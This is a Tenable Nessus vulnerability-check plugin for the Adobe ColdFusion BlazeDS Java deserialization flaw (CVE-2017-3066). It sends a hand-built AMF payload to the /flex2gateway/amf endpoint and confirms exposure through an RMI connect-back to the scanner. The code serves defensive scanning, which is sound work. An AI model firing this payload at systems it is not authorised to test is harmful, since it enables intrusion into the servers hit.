#TRUSTED 80d54b6d3ca02ccd30c9279385253145253a3668b302577e80e0b17a30a541840b9df584d95e29547123c22dc7a31bbb636c4942a3e48bc85694998baae424830b5908ea25fbe4781b51f228945e17f49c5128f23392119751c9bb602911b2741b3dfef14150ce929bfe0c15ae0b21259ef7826a82dd13d07a206bfbf6c2b45ccebcbc917f3a6dc91d798ef3e898c402b5eaad5b54b0cb5aafb442e4c7b6c3efe3eacbad26159cedf8c24143e4c3f4b3de02ee5a9bfdb87d3d1237cea13574844ca77a44e3d1ccd25b56dcb427ede4d375aadfe039824cf76a1a1e7ee75bcde2928dda65038f1e234c88cb949cfece7551d725963587bfe51ae966cb2d9ac49356134b5e3618bdd442a223d496d1e7dbacf6d28728d59cdbd65edc438af9f427458b2883a9b11cc8f3587146e5fb8405abdb7945a4373cad6b6d2498410e16add83ff3af687912e7e7a5f0d1d46dc32269544cb12d5628a4dcec4f30d30642a27effda0594a6dd4ce38d69c013185e7c8d73a01a6cc1e771e01457ab55b9c476665486fc2a2f55702b4f2d378bec4cd69fe74f92bd85672a424190deb4d53f298fe2d1eb11624d4ab8769c9ac3cebfce1a1173a3f7d30d758f27bf40be4ebc492ca8306e04b0bed322944ce644bfd64b9411ecff74a6d6f6e386f080bfd2d5845e9b46cee0faa404c9247fd4522986d6aa27b9e33b77bf5716d1945a319ff8ee

#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(99731);
  script_version("1.3");
  script_set_attribute(attribute:"plugin_modification_date", value:"2017/05/01");

  script_cve_id("CVE-2017-3066");
  script_bugtraq_id(98003);
  script_osvdb_id(156287);
  script_xref(name:"IAVA", value:"2017-A-0122");

  script_name(english:"Adobe ColdFusion BlazeDS Java Object Deserialization RCE");
  script_summary(english:"Creates an RMI connect back.");

  script_set_attribute(attribute:"synopsis", value:
"A web-based application running on the remote host is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Adobe ColdFusion running on the remote host is affected
by a Java deserialization flaw in the Apache BlazeDS library when
handling untrusted Java objects. An unauthenticated, remote attacker
can exploit this to execute arbitrary code.");
  script_set_attribute(attribute:"see_also", value:"https://codewhitesec.blogspot.com/2017/04/amf.html");
  script_set_attribute(attribute:"see_also", value:"https://helpx.adobe.com/security/products/coldfusion/apsb17-14.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Adobe ColdFusion version 10 update 23 / 11 update 12 / 2016
update 4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/04/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/04/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/04/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_keys("installed_sw/ColdFusion");
  script_require_ports("Services/www", 80, 8500);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("install_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);
port = get_http_port(default:80);
install = get_single_install(app_name:app, port:port);

# create the listening socket the attack will call back to
bind_result = bind_sock_tcp();
if (isnull(bind_result) || len(bind_result) != 2) exit(1, "Failed to create bind socket.");
listening_soc = bind_result[0];
listening_port = bind_result[1];

# connect to the server
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, app);

# generate the connect back
cb_address = this_host();
amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' +
              '\x07\x33sun.rmi.server.UnicastRef' + mkword(len(cb_address)) + cb_address +
              mkdword(listening_port) +
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';

# build the request
request = 'POST /flex2gateway/amf HTTP/1.1\r\n' +
          'Host: ' + get_host_ip() + ':' + port + '\r\n' +
          'Content-Type: application/x-amf\r\n' +
          'Content-Length: ' + len(amf_payload) + '\r\n' +
          '\r\n' + amf_payload;

# send the request
send(socket:soc, data:request);
 
# listen for the connect back
cb_soc = sock_accept(socket:listening_soc, timeout:5);
if (!cb_soc)
{
  close(listening_soc);
  close(soc);
  audit(AUDIT_LISTEN_NOT_VULN, app, port);
}

# grab the result 
resp = recv(socket:cb_soc, length:4096);

# close all the sockets
close(cb_soc);
close(listening_soc);
close(soc);

# ensure the connect back is what we expected
if ('JRMI' >!< resp) audit(AUDIT_LISTEN_NOT_VULN, app, port);

report =
  '\nNessus was able to exploit a Java deserialization vulnerability by' +
  '\nsending a crafted Java object.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_HOLE, extra:report);
